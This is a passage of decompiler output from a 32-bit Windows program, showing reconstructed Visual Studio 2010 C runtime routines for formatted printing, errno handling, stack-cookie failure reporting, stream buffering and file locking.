      param_2[param_3 - 1] = '\0';
      iVar3 = (-1 < local_24._cnt) - 2;
    }
  }
  else {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004071df();
    iVar3 = -1;
  }
  return iVar3;
}



// Library Function - Single Match
//  __vsprintf_s_l
// 
// Library: Visual Studio 2010 Release

int __cdecl
__vsprintf_s_l(char *_DstBuf,size_t _DstSize,char *_Format,_locale_t _Locale,va_list _ArgList)

{
  int *piVar1;
  int iVar2;
  
  if (_Format == (char *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004071df();
    return -1;
  }
  if ((_DstBuf == (char *)0x0) || (_DstSize == 0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
  }
  else {
    iVar2 = __vsnprintf_helper(__output_s_l,_DstBuf,_DstSize,(int)_Format,_Locale,_ArgList);
    if (iVar2 < 0) {
      *_DstBuf = '\0';
    }
    if (iVar2 != -2) {
      return iVar2;
    }
    piVar1 = __errno();
    *piVar1 = 0x22;
  }
  FUN_004071df();
  return -1;
}



// Library Function - Single Match
//  _vsprintf_s
// 
// Library: Visual Studio 2010 Release

int __cdecl _vsprintf_s(char *_DstBuf,size_t _SizeInBytes,char *_Format,va_list _ArgList)

{
  int iVar1;
  
  iVar1 = __vsprintf_s_l(_DstBuf,_SizeInBytes,_Format,(_locale_t)0x0,_ArgList);
  return iVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  ___report_gsfailure
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ___report_gsfailure(void)

{
  undefined4 in_EAX;
  HANDLE hProcess;
  undefined4 in_ECX;
  undefined4 in_EDX;
  undefined4 unaff_EBX;
  undefined4 unaff_EBP;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined2 in_ES;
  undefined2 in_CS;
  undefined2 in_SS;
  undefined2 in_DS;
  undefined2 in_FS;
  undefined2 in_GS;
  byte in_AF;
  byte in_TF;
  byte in_IF;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  undefined4 unaff_retaddr;
  UINT uExitCode;
  undefined4 local_32c;
  undefined4 local_328;
  
  _DAT_00417078 =
       (uint)(in_NT & 1) * 0x4000 | (uint)SBORROW4((int)&stack0xfffffffc,0x328) * 0x800 |
       (uint)(in_IF & 1) * 0x200 | (uint)(in_TF & 1) * 0x100 | (uint)((int)&local_32c < 0) * 0x80 |
       (uint)(&stack0x00000000 == (undefined *)0x32c) * 0x40 | (uint)(in_AF & 1) * 0x10 |
       (uint)((POPCOUNT((uint)&local_32c & 0xff) & 1U) == 0) * 4 |
       (uint)(&stack0xfffffffc < (undefined *)0x328) | (uint)(in_ID & 1) * 0x200000 |
       (uint)(in_VIP & 1) * 0x100000 | (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000;
  _DAT_0041707c = &stack0x00000004;
  _DAT_00416fb8 = 0x10001;
  _DAT_00416f60 = 0xc0000409;
  _DAT_00416f64 = 1;
  local_32c = DAT_00416048;
  local_328 = DAT_0041604c;
  _DAT_00416f6c = unaff_retaddr;
  _DAT_00417044 = in_GS;
  _DAT_00417048 = in_FS;
  _DAT_0041704c = in_ES;
  _DAT_00417050 = in_DS;
  _DAT_00417054 = unaff_EDI;
  _DAT_00417058 = unaff_ESI;
  _DAT_0041705c = unaff_EBX;
  _DAT_00417060 = in_EDX;
  _DAT_00417064 = in_ECX;
  _DAT_00417068 = in_EAX;
  _DAT_0041706c = unaff_EBP;
  DAT_00417070 = unaff_retaddr;
  _DAT_00417074 = in_CS;
  _DAT_00417080 = in_SS;
  DAT_00416fb0 = IsDebuggerPresent();
  FUN_0040d20c();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  UnhandledExceptionFilter((_EXCEPTION_POINTERS *)&PTR_DAT_00412268);
  if (DAT_00416fb0 == 0) {
    FUN_0040d20c();
  }
  uExitCode = 0xc0000409;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  return;
}



void __cdecl FUN_00407055(undefined4 param_1)

{
  DAT_00417284 = param_1;
  return;
}



// Library Function - Single Match
//  __call_reportfault
// 
// Library: Visual Studio 2010 Release

void __cdecl __call_reportfault(int nDbgHookCode,DWORD dwExceptionCode,DWORD dwExceptionFlags)

{
  uint uVar1;
  BOOL BVar2;
  LONG LVar3;
  _EXCEPTION_POINTERS local_32c;
  EXCEPTION_RECORD local_324;
  undefined4 local_2d4;
  
  uVar1 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  if (nDbgHookCode != -1) {
    FUN_0040d20c();
  }
  local_324.ExceptionCode = 0;
  _memset(&local_324.ExceptionFlags,0,0x4c);
  local_32c.ExceptionRecord = &local_324;
  local_32c.ContextRecord = (PCONTEXT)&local_2d4;
  local_2d4 = 0x10001;
  local_324.ExceptionCode = dwExceptionCode;
  local_324.ExceptionFlags = dwExceptionFlags;
  BVar2 = IsDebuggerPresent();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  LVar3 = UnhandledExceptionFilter(&local_32c);
  if (((LVar3 == 0) && (BVar2 == 0)) && (nDbgHookCode != -1)) {
    FUN_0040d20c();
  }
  ___security_check_cookie_4(uVar1 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __invoke_watson
// 
// Library: Visual Studio 2010 Release

void __cdecl
__invoke_watson(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,uintptr_t param_5)

{
  HANDLE hProcess;
  UINT uExitCode;
  
  __call_reportfault(2,0xc0000417,1);
  uExitCode = 0xc0000417;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  return;
}



// Library Function - Single Match
//  __invalid_parameter
// 
// Libraries: Visual Studio 2010 Release, Visual Studio 2012 Release

void __invalid_parameter(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,
                        uintptr_t param_5)

{
  code *UNRECOVERED_JUMPTABLE;
  
  UNRECOVERED_JUMPTABLE = (code *)DecodePointer(DAT_00417284);
  if (UNRECOVERED_JUMPTABLE != (code *)0x0) {
                    // WARNING: Could not recover jumptable at 0x004071c8. Too many branches
                    // WARNING: Treating indirect jump as call
    (*UNRECOVERED_JUMPTABLE)();
    return;
  }
                    // WARNING: Subroutine does not return
  __invoke_watson(param_1,param_2,param_3,param_4,param_5);
}



void FUN_004071df(void)

{
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return;
}



// Library Function - Single Match
//  __get_errno_from_oserr
// 
// Library: Visual Studio 2010 Release

int __cdecl __get_errno_from_oserr(ulong param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  do {
    if (param_1 == (&DAT_00416050)[uVar1 * 2]) {
      return (&DAT_00416054)[uVar1 * 2];
    }
    uVar1 = uVar1 + 1;
  } while (uVar1 < 0x2d);
  if (param_1 - 0x13 < 0x12) {
    return 0xd;
  }
  return (-(uint)(0xe < param_1 - 0xbc) & 0xe) + 8;
}



// Library Function - Single Match
//  __errno
// 
// Library: Visual Studio 2010 Release

int * __cdecl __errno(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    return (int *)&DAT_004161b8;
  }
  return &p_Var1->_terrno;
}



// Library Function - Single Match
//  ___doserrno
// 
// Library: Visual Studio 2010 Release

ulong * __cdecl ___doserrno(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    return (ulong *)&DAT_004161bc;
  }
  return &p_Var1->_tdoserrno;
}



// Library Function - Single Match
//  __dosmaperr
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __dosmaperr(ulong param_1)

{
  ulong *puVar1;
  int iVar2;
  int *piVar3;
  
  puVar1 = ___doserrno();
  *puVar1 = param_1;
  iVar2 = __get_errno_from_oserr(param_1);
  piVar3 = __errno();
  *piVar3 = iVar2;
  return;
}



// Library Function - Single Match
//  __flsbuf
// 
// Library: Visual Studio 2010 Release

int __cdecl __flsbuf(int _Ch,FILE *_File)

{
  char *_Buf;
  char *pcVar1;
  FILE *_File_00;
  int *piVar2;
  undefined **ppuVar3;
  int iVar4;
  undefined *puVar5;
  int unaff_EDI;
  uint uVar6;
  longlong lVar7;
  uint local_8;
  
  _File_00 = _File;
  _File = (FILE *)__fileno(_File);
  uVar6 = _File_00->_flag;
  if ((uVar6 & 0x82) == 0) {
    piVar2 = __errno();
    *piVar2 = 9;
LAB_004072a0:
    _File_00->_flag = _File_00->_flag | 0x20;
    return -1;
  }
  if ((uVar6 & 0x40) != 0) {
    piVar2 = __errno();
    *piVar2 = 0x22;
    goto LAB_004072a0;
  }
  if ((uVar6 & 1) != 0) {
    _File_00->_cnt = 0;
    if ((uVar6 & 0x10) == 0) {
      _File_00->_flag = uVar6 | 0x20;
      return -1;
    }
    _File_00->_ptr = _File_00->_base;
    _File_00->_flag = uVar6 & 0xfffffffe;
  }
  uVar6 = _File_00->_flag;
  _File_00->_flag = uVar6 & 0xffffffef | 2;
  _File_00->_cnt = 0;
  local_8 = 0;
  if (((uVar6 & 0x10c) == 0) &&
     (((ppuVar3 = FUN_0040803a(), _File_00 != (FILE *)(ppuVar3 + 8) &&
       (ppuVar3 = FUN_0040803a(), _File_00 != (FILE *)(ppuVar3 + 0x10))) ||
      (iVar4 = __isatty((int)_File), iVar4 == 0)))) {
    __getbuf(_File_00);
  }
  if ((_File_00->_flag & 0x108U) == 0) {
    uVar6 = 1;
    local_8 = __write((int)_File,&_Ch,1);
  }
  else {
    _Buf = _File_00->_base;
    pcVar1 = _File_00->_ptr;
    _File_00->_ptr = _Buf + 1;
    uVar6 = (int)pcVar1 - (int)_Buf;
    _File_00->_cnt = _File_00->_bufsiz + -1;
    if ((int)uVar6 < 1) {
      if ((_File == (FILE *)0xffffffff) || (_File == (FILE *)0xfffffffe)) {
        puVar5 = &DAT_00416540;
      }
      else {
        puVar5 = (undefined *)(((uint)_File & 0x1f) * 0x40 + (&DAT_00418ea0)[(int)_File >> 5]);
      }
      if (((puVar5[4] & 0x20) != 0) &&
         (lVar7 = __lseeki64((int)_File,0x200000000,unaff_EDI), lVar7 == -1)) goto LAB_004073c8;
    }
    else {
      local_8 = __write((int)_File,_Buf,uVar6);
    }
    *_File_00->_base = (char)_Ch;
  }
  if (local_8 == uVar6) {
    return _Ch & 0xff;
  }
LAB_004073c8:
  _File_00->_flag = _File_00->_flag | 0x20;
  return -1;
}



// Library Function - Single Match
//  _write_char
// 
// Library: Visual Studio 2010 Release

void __cdecl _write_char(wchar_t param_1)

{
  wint_t wVar1;
  FILE *in_EAX;
  int *unaff_ESI;
  
  if (((*(byte *)&in_EAX->_flag & 0x40) == 0) || (in_EAX->_base != (char *)0x0)) {
    wVar1 = __fputwc_nolock(param_1,in_EAX);
    if (wVar1 == 0xffff) {
      *unaff_ESI = -1;
      return;
    }
  }
  *unaff_ESI = *unaff_ESI + 1;
  return;
}



// Library Function - Single Match
//  _write_string
// 
// Library: Visual Studio 2010 Release

void __thiscall _write_string(void *this,wchar_t *param_1)

{
  int iVar1;
  int *in_EAX;
  int *piVar2;
  int unaff_EDI;
  
  piVar2 = __errno();
  iVar1 = *piVar2;
  if (((*(byte *)(unaff_EDI + 0xc) & 0x40) == 0) || (*(int *)(unaff_EDI + 8) != 0)) {
    piVar2 = __errno();
    *piVar2 = 0;
    while (0 < (int)this) {
      this = (void *)((int)this + -1);
      _write_char(*param_1);
      param_1 = param_1 + 1;
      if (*in_EAX == -1) {
        piVar2 = __errno();
        if (*piVar2 != 0x2a) break;
        _write_char(L'?');
      }
    }
    piVar2 = __errno();
    if (*piVar2 == 0) {
      piVar2 = __errno();
      *piVar2 = iVar1;
    }
  }
  else {
    *in_EAX = *in_EAX + (int)this;
  }
  return;
}



// WARNING: Type propagation algorithm not settling
// Library Function - Single Match
//  __woutput_s_l
// 
// Library: Visual Studio 2010 Release

int __cdecl __woutput_s_l(FILE *_File,wchar_t *_Format,_locale_t _Locale,va_list _ArgList)

{
  wchar_t wVar1;
  wchar_t wVar2;
  int *piVar3;
  uint uVar4;
  code *pcVar5;
  int iVar6;
  int extraout_ECX;
  byte *pbVar7;
  wchar_t *pwVar8;
  int *piVar9;
  byte *pbVar10;
  int **ppiVar11;
  bool bVar12;
  longlong lVar13;
  undefined8 uVar14;
  undefined4 uVar15;
  localeinfo_struct *plVar16;
  int *local_478;
  int *local_474;
  byte *local_46c;
  uint local_468;
  undefined4 local_464;
  wchar_t *local_460;
  int *local_45c;
  int local_458;
  int local_454;
  localeinfo_struct local_450;
  int local_448;
  char local_444;
  uint local_440;
  wchar_t local_43c;
  short local_43a;
  char local_438;
  undefined local_437;
  int *local_434;
  FILE *local_430;
  int local_42c;
  void *local_428;
  uint local_424;
  int local_420;
  int **local_41c;
  byte *local_418;
  int *local_414;
  int *local_410;
  uint local_40c;
  int local_408 [127];
  undefined4 local_209;
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  local_430 = _File;
  local_41c = (int **)_ArgList;
  local_458 = 0;
  local_40c = 0;
  local_434 = (int *)0x0;
  local_410 = (int *)0x0;
  local_428 = (void *)0x0;
  local_454 = 0;
  local_42c = 0;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_450,_Locale);
  if ((_File == (FILE *)0x0) || (_Format == (wchar_t *)0x0)) {
switchD_004075a9_caseD_9:
    piVar3 = __errno();
    *piVar3 = 0x16;
    FUN_004071df();
    if (local_444 != '\0') {
      *(uint *)(local_448 + 0x70) = *(uint *)(local_448 + 0x70) & 0xfffffffd;
    }
  }
  else {
    local_424 = (uint)(ushort)*_Format;
    local_420 = 0;
    local_418 = (byte *)0x0;
    local_440 = 0;
    local_45c = (int *)0x0;
    if (*_Format != L'\0') {
      do {
        pwVar8 = _Format + 1;
        uVar4 = 0;
        local_460 = pwVar8;
        if (local_420 < 0) break;
        wVar2 = (wchar_t)local_424;
        if ((ushort)(wVar2 + L'￠') < 0x59) {
          uVar4 = (byte)(&DAT_00413248)[local_424] & 0xf;
        }
        local_440 = (uint)((byte)(&DAT_00413268)[local_440 + uVar4 * 9] >> 4);
        ppiVar11 = local_41c;
        switch(local_440) {
        case 0:
switchD_004075a9_caseD_0:
          local_42c = 1;
          _write_char(wVar2);
          ppiVar11 = (int **)_ArgList;
          break;
        case 1:
          local_410 = (int *)0xffffffff;
          local_464 = 0;
          local_454 = 0;
          local_434 = (int *)0x0;
          local_428 = (void *)0x0;
          local_40c = 0;
          local_42c = 0;
          ppiVar11 = (int **)_ArgList;
          break;
        case 2:
          if (local_424 == 0x20) {
            local_40c = local_40c | 2;
            ppiVar11 = (int **)_ArgList;
          }
          else if (local_424 == 0x23) {
            local_40c = local_40c | 0x80;
            ppiVar11 = (int **)_ArgList;
          }
          else if (local_424 == 0x2b) {
            local_40c = local_40c | 1;
            ppiVar11 = (int **)_ArgList;
          }
          else if (local_424 == 0x2d) {
            local_40c = local_40c | 4;
            ppiVar11 = (int **)_ArgList;
          }
          else if (local_424 == 0x30) {
            local_40c = local_40c | 8;
            ppiVar11 = (int **)_ArgList;
          }
          break;
        case 3:
          if (wVar2 == L'*') {
            local_434 = *(int **)_ArgList;
            local_41c = (int **)((int)_ArgList + 4);
            ppiVar11 = local_41c;
            if ((int)local_434 < 0) {
              local_40c = local_40c | 4;
              local_434 = (int *)-(int)local_434;
            }
          }
          else {
            local_434 = (int *)((int)local_434 * 10 + -0x30 + local_424);
            ppiVar11 = (int **)_ArgList;
          }
          break;
        case 4:
          local_410 = (int *)0x0;
          ppiVar11 = (int **)_ArgList;
          break;
        case 5:
          if (wVar2 == L'*') {
            local_410 = *(int **)_ArgList;
            local_41c = (int **)((int)_ArgList + 4);
            ppiVar11 = local_41c;
            if ((int)local_410 < 0) {
              local_410 = (int *)0xffffffff;
            }
          }
          else {
            local_410 = (int *)((int)local_410 * 10 + -0x30 + local_424);
            ppiVar11 = (int **)_ArgList;
          }
          break;
        case 6:
          if (local_424 == 0x49) {
            wVar1 = *pwVar8;
            if ((wVar1 == L'6') && (_Format[2] == L'4')) {
              local_40c = local_40c | 0x8000;
              pwVar8 = _Format + 3;
              ppiVar11 = (int **)_ArgList;
            }
            else if ((wVar1 == L'3') && (_Format[2] == L'2')) {
              local_40c = local_40c & 0xffff7fff;
              pwVar8 = _Format + 3;
              ppiVar11 = (int **)_ArgList;
            }
            else {
              ppiVar11 = (int **)_ArgList;
              if (((((wVar1 != L'd') && (wVar1 != L'i')) && (wVar1 != L'o')) &&
                  ((wVar1 != L'u' && (wVar1 != L'x')))) && (wVar1 != L'X')) {
                local_440 = 0;
                goto switchD_004075a9_caseD_0;
              }
            }
          }
          else if (local_424 == 0x68) {
            local_40c = local_40c | 0x20;
            ppiVar11 = (int **)_ArgList;
          }
          else if (local_424 == 0x6c) {
            if (*pwVar8 == L'l') {
              local_40c = local_40c | 0x1000;
              pwVar8 = _Format + 2;
              ppiVar11 = (int **)_ArgList;
            }
            else {
              local_40c = local_40c | 0x10;
              ppiVar11 = (int **)_ArgList;
            }
          }
          else {
            ppiVar11 = (int **)_ArgList;
            if (local_424 == 0x77) {
              local_40c = local_40c | 0x800;
            }
          }
          break;
        case 7:
          if (local_424 < 0x65) {
            if (local_424 == 100) {
LAB_00407aa5:
              local_40c = local_40c | 0x40;
LAB_00407aac:
              local_424 = 10;
LAB_00407ab6:
              if (((local_40c & 0x8000) == 0) && ((local_40c & 0x1000) == 0)) {
                local_41c = (int **)((int)_ArgList + 4);
                if ((local_40c & 0x20) == 0) {
                  piVar3 = *(int **)_ArgList;
                  if ((local_40c & 0x40) == 0) {
                    piVar9 = (int *)0x0;
                  }
                  else {
                    piVar9 = (int *)((int)piVar3 >> 0x1f);
                  }
                }
                else {
                  if ((local_40c & 0x40) == 0) {
                    piVar3 = (int *)(uint)*(ushort *)_ArgList;
                  }
                  else {
                    piVar3 = (int *)(int)*(short *)_ArgList;
                  }
                  piVar9 = (int *)((int)piVar3 >> 0x1f);
                }
              }
              else {
                local_41c = (int **)((int)_ArgList + 8);
                piVar3 = *(int **)_ArgList;
                piVar9 = *(int **)((int)_ArgList + 4);
              }
              if ((((local_40c & 0x40) != 0) && ((int)piVar9 < 1)) && ((int)piVar9 < 0)) {
                bVar12 = piVar3 != (int *)0x0;
                piVar3 = (int *)-(int)piVar3;
                piVar9 = (int *)-(int)((int)piVar9 + (uint)bVar12);
                local_40c = local_40c | 0x100;
              }
              if ((local_40c & 0x9000) == 0) {
                piVar9 = (int *)0x0;
              }
              lVar13 = CONCAT44(piVar9,piVar3);
              if ((int)local_410 < 0) {
                local_410 = (int *)0x1;
              }
              else {
                local_40c = local_40c & 0xfffffff7;
                if (0x200 < (int)local_410) {
                  local_410 = (int *)0x200;
                }
              }
              if (((uint)piVar3 | (uint)piVar9) == 0) {
                local_428 = (void *)0x0;
              }
              piVar3 = &local_209;
              while( true ) {
                pbVar10 = (byte *)((ulonglong)lVar13 >> 0x20);
                piVar9 = (int *)((int)local_410 + -1);
                if (((int)local_410 < 1) && (lVar13 == 0)) break;
                local_410 = piVar9;
                lVar13 = __aulldvrm((uint)lVar13,(uint)pbVar10,local_424,(int)local_424 >> 0x1f);
                iVar6 = extraout_ECX + 0x30;
                if (0x39 < iVar6) {
                  iVar6 = iVar6 + local_458;
                }
                *(byte *)piVar3 = (byte)iVar6;
                piVar3 = (int *)((int)piVar3 + -1);
                local_46c = pbVar10;
              }
              local_418 = (byte *)((int)&local_209 + -(int)piVar3);
              local_414 = (int *)((int)piVar3 + 1);
              local_410 = piVar9;
              if (((local_40c & 0x200) != 0) &&
                 ((local_418 == (byte *)0x0 || (*(byte *)local_414 != 0x30)))) {
                *(byte *)piVar3 = 0x30;
                local_418 = (byte *)((int)&local_209 + -(int)piVar3 + 1);
                local_414 = piVar3;
              }
            }
            else if (local_424 < 0x54) {
              if (local_424 == 0x53) {
                if ((local_40c & 0x830) == 0) {
                  local_40c = local_40c | 0x20;
                }
                goto LAB_00407880;
              }
              if (local_424 != 0x41) {
                if (local_424 == 0x43) {
                  if ((local_40c & 0x830) == 0) {
                    local_40c = local_40c | 0x20;
                  }
LAB_0040792e:
                  wVar2 = *(wchar_t *)_ArgList;
                  local_468 = (uint)(ushort)wVar2;
                  local_41c = (int **)((int)_ArgList + 4);
                  local_42c = 1;
                  if ((local_40c & 0x20) == 0) {
                    local_408[0]._0_2_ = wVar2;
                  }
                  else {
                    local_438 = (char)wVar2;
                    local_437 = 0;
                    iVar6 = __mbtowc_l((wchar_t *)local_408,&local_438,
                                       (size_t)(local_450.locinfo)->locale_name[3],&local_450);
                    if (iVar6 < 0) {
                      local_454 = 1;
                    }
                  }
                  local_418 = (byte *)0x1;
                  local_414 = local_408;
                  goto LAB_00407de7;
                }
                if ((local_424 != 0x45) && (local_424 != 0x47)) goto LAB_00407de7;
              }
              local_424 = local_424 + 0x20;
              local_464 = 1;
LAB_00407817:
              local_40c = local_40c | 0x40;
              local_418 = (byte *)0x200;
              piVar3 = local_408;
              pbVar10 = local_418;
              piVar9 = local_408;
              if ((int)local_410 < 0) {
                local_410 = (int *)0x6;
              }
              else if (local_410 == (int *)0x0) {
                if ((short)local_424 == 0x67) {
                  local_410 = (int *)0x1;
                }
              }
              else {
                if (0x200 < (int)local_410) {
                  local_410 = (int *)0x200;
                }
                if (0xa3 < (int)local_410) {
                  pbVar10 = (byte *)((int)local_410 + 0x15d);
                  local_414 = local_408;
                  local_45c = (int *)__malloc_crt((size_t)pbVar10);
                  piVar3 = local_45c;
                  piVar9 = local_45c;
                  if (local_45c == (int *)0x0) {
                    local_410 = (int *)0xa3;
                    piVar3 = local_408;
                    pbVar10 = local_418;
                    piVar9 = local_414;
                  }
                }
              }
              local_414 = piVar9;
              local_418 = pbVar10;
              local_478 = *local_41c;
              local_474 = local_41c[1];
              plVar16 = &local_450;
              uVar14 = CONCAT44(local_410,(int)(char)local_424);
              ppiVar11 = &local_478;
              piVar9 = piVar3;
              pbVar10 = local_418;
              uVar15 = local_464;
              local_41c = local_41c + 2;
              pcVar5 = (code *)DecodePointer(PTR_LAB_00416d44);
              (*pcVar5)(ppiVar11,piVar9,pbVar10,uVar14,uVar15,plVar16);
              uVar4 = local_40c & 0x80;
              if ((uVar4 != 0) && (local_410 == (int *)0x0)) {
                plVar16 = &local_450;
                piVar9 = piVar3;
                pcVar5 = (code *)DecodePointer(PTR_LAB_00416d50);
                (*pcVar5)(piVar9,plVar16);
              }
              if (((short)local_424 == 0x67) && (uVar4 == 0)) {
                plVar16 = &local_450;
                piVar9 = piVar3;
                pcVar5 = (code *)DecodePointer(PTR_LAB_00416d4c);
                (*pcVar5)(piVar9,plVar16);
              }
              if (*(byte *)piVar3 == 0x2d) {
                local_40c = local_40c | 0x100;
                piVar3 = (int *)((int)piVar3 + 1);
                local_414 = piVar3;
              }
LAB_00407a07:
              local_418 = (byte *)_strlen((char *)piVar3);
            }
            else {
              if (local_424 == 0x58) goto LAB_00407c0c;
              if (local_424 == 0x5a) {
                piVar3 = *(int **)_ArgList;
                local_41c = (int **)((int)_ArgList + 4);
                if ((piVar3 == (int *)0x0) ||
                   (local_414 = (int *)piVar3[1], local_414 == (int *)0x0)) {
                  local_414 = (int *)PTR_DAT_00416d24;
                  piVar3 = (int *)PTR_DAT_00416d24;
                  goto LAB_00407a07;
                }
                local_418 = (byte *)(int)(short)*(ushort *)piVar3;
                if ((local_40c & 0x800) != 0) {
                  iVar6 = (int)local_418 - ((int)local_418 >> 0x1f);
                  goto LAB_00407ddf;
                }
                local_42c = 0;
              }
              else {
                if (local_424 == 0x61) goto LAB_00407817;
                if (local_424 == 99) goto LAB_0040792e;
              }
            }
LAB_00407de7:
            if (local_454 == 0) {
              if ((local_40c & 0x40) != 0) {
                if ((local_40c & 0x100) == 0) {
                  if ((local_40c & 1) == 0) {
                    if ((local_40c & 2) == 0) goto LAB_00407e29;
                    local_43c = L' ';
                  }
                  else {
                    local_43c = L'+';
                  }
                }
                else {
                  local_43c = L'-';
                }
                local_428 = (void *)0x1;
              }
LAB_00407e29:
              pbVar7 = (byte *)((int)local_434 + (-(int)local_428 - (int)local_418));
              local_46c = pbVar7;
              pbVar10 = pbVar7;
              if ((local_40c & 0xc) == 0) {
                do {
                  if ((int)pbVar10 < 1) break;
                  pbVar10 = pbVar10 + -1;
                  _write_char(L' ');
                } while (local_420 != -1);
              }
              _write_string(local_428,&local_43c);
              if (((local_40c & 8) != 0) && ((local_40c & 4) == 0)) {
                do {
                  if ((int)pbVar7 < 1) break;
                  pbVar7 = pbVar7 + -1;
                  _write_char(L'0');
                } while (local_420 != -1);
              }
              if ((local_42c == 0) && (pbVar10 = local_418, piVar3 = local_414, 0 < (int)local_418))
              {
                do {
                  pbVar10 = pbVar10 + -1;
                  local_424 = __mbtowc_l((wchar_t *)&local_468,(char *)piVar3,
                                         (size_t)(local_450.locinfo)->locale_name[3],&local_450);
                  if ((int)local_424 < 1) {
                    local_420 = -1;
                    break;
                  }
                  _write_char((wchar_t)local_468);
                  piVar3 = (int *)((int)piVar3 + local_424);
                } while (0 < (int)pbVar10);
              }
              else {
                _write_string(local_418,(wchar_t *)local_414);
              }
              if ((-1 < local_420) && (pbVar10 = local_46c, (local_40c & 4) != 0)) {
                do {
                  if ((int)pbVar10 < 1) break;
                  _write_char(L' ');
                  pbVar10 = pbVar10 + -1;
                } while (local_420 != -1);
              }
            }
          }
          else {
            if (0x70 < local_424) {
              if (local_424 == 0x73) {
LAB_00407880:
                piVar3 = (int *)0x7fffffff;
                if (local_410 != (int *)0xffffffff) {
                  piVar3 = local_410;
                }
                local_41c = (int **)((int)_ArgList + 4);
                local_414 = *(int **)_ArgList;
                if ((local_40c & 0x20) == 0) {
                  piVar9 = local_414;
                  if (local_414 == (int *)0x0) {
                    local_414 = (int *)PTR_u__null__00416d28;
                    piVar9 = (int *)PTR_u__null__00416d28;
                  }
                  for (; (piVar3 != (int *)0x0 &&
                         (piVar3 = (int *)((int)piVar3 + -1), *(ushort *)piVar9 != 0));
                      piVar9 = (int *)((int)piVar9 + 2)) {
                  }
                  iVar6 = (int)piVar9 - (int)local_414;
LAB_00407ddf:
                  local_41c = (int **)((int)_ArgList + 4);
                  local_42c = 1;
                  local_418 = (byte *)(iVar6 >> 1);
                }
                else {
                  if (local_414 == (int *)0x0) {
                    local_414 = (int *)PTR_DAT_00416d24;
                  }
                  local_418 = (byte *)0x0;
                  piVar9 = local_414;
                  if (0 < (int)piVar3) {
                    do {
                      if (*(byte *)piVar9 == 0) break;
                      iVar6 = __isleadbyte_l((uint)*(byte *)piVar9,&local_450);
                      if (iVar6 != 0) {
                        piVar9 = (int *)((int)piVar9 + 1);
                      }
                      piVar9 = (int *)((int)piVar9 + 1);
                      local_418 = local_418 + 1;
                    } while ((int)local_418 < (int)piVar3);
                  }
                }
                goto LAB_00407de7;
              }
              if (local_424 == 0x75) goto LAB_00407aac;
              if (local_424 != 0x78) goto LAB_00407de7;
              local_458 = 0x27;
LAB_00407c3c:
              local_424 = 0x10;
              if ((local_40c & 0x80) != 0) {
                local_43c = L'0';
                local_43a = (short)local_458 + 0x51;
                local_428 = (void *)0x2;
              }
              goto LAB_00407ab6;
            }
            if (local_424 == 0x70) {
              local_410 = (int *)0x8;
LAB_00407c0c:
              local_458 = 7;
              goto LAB_00407c3c;
            }
            if (local_424 < 0x65) goto LAB_00407de7;
            if (local_424 < 0x68) goto LAB_00407817;
            if (local_424 == 0x69) goto LAB_00407aa5;
            if (local_424 != 0x6e) {
              if (local_424 != 0x6f) goto LAB_00407de7;
              local_424 = 8;
              if ((local_40c & 0x80) != 0) {
                local_40c = local_40c | 0x200;
              }
              goto LAB_00407ab6;
            }
            piVar3 = *(int **)_ArgList;
            local_41c = (int **)((int)_ArgList + 4);
            iVar6 = __get_printf_count_output();
            if (iVar6 == 0) goto switchD_004075a9_caseD_9;
            if ((local_40c & 0x20) == 0) {
              *piVar3 = local_420;
            }
            else {
              *(ushort *)piVar3 = (ushort)local_420;
            }
            local_454 = 1;
          }
          pwVar8 = local_460;
          ppiVar11 = local_41c;
          if (local_45c != (int *)0x0) {
            _free(local_45c);
            local_45c = (int *)0x0;
            pwVar8 = local_460;
            ppiVar11 = local_41c;
          }
          break;
        default:
          goto switchD_004075a9_caseD_9;
        case 0xbad1abe1:
          break;
        }
        local_424 = (uint)(ushort)*pwVar8;
        _Format = pwVar8;
        _ArgList = (va_list)ppiVar11;
      } while (*pwVar8 != L'\0');
      if ((local_440 != 0) && (local_440 != 7)) goto switchD_004075a9_caseD_9;
    }
    if (local_444 != '\0') {
      *(uint *)(local_448 + 0x70) = *(uint *)(local_448 + 0x70) & 0xfffffffd;
    }
  }
  iVar6 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar6;
}



undefined ** FUN_0040803a(void)

{
  return &PTR_DAT_004161c0;
}



// Library Function - Single Match
//  __lock_file
// 
// Library: Visual Studio 2010 Release

void __cdecl __lock_file(FILE *_File)

{
  if ((_File < &PTR_DAT_004161c0) || ((FILE *)&DAT_00416420 < _File)) {
    EnterCriticalSection((LPCRITICAL_SECTION)(_File + 1));
  }
  else {
    __lock(((int)(_File + -0x20b0e) >> 5) + 0x10);
    _File->_flag = _File->_flag | 0x8000;
  }
  return;
}



// Library Function - Single Match
//  __lock_file2
// 
// Library: Visual Studio 2010 Release

void __cdecl __lock_file2(int _Index,void *_File)

{
  if (_Index < 0x14) {
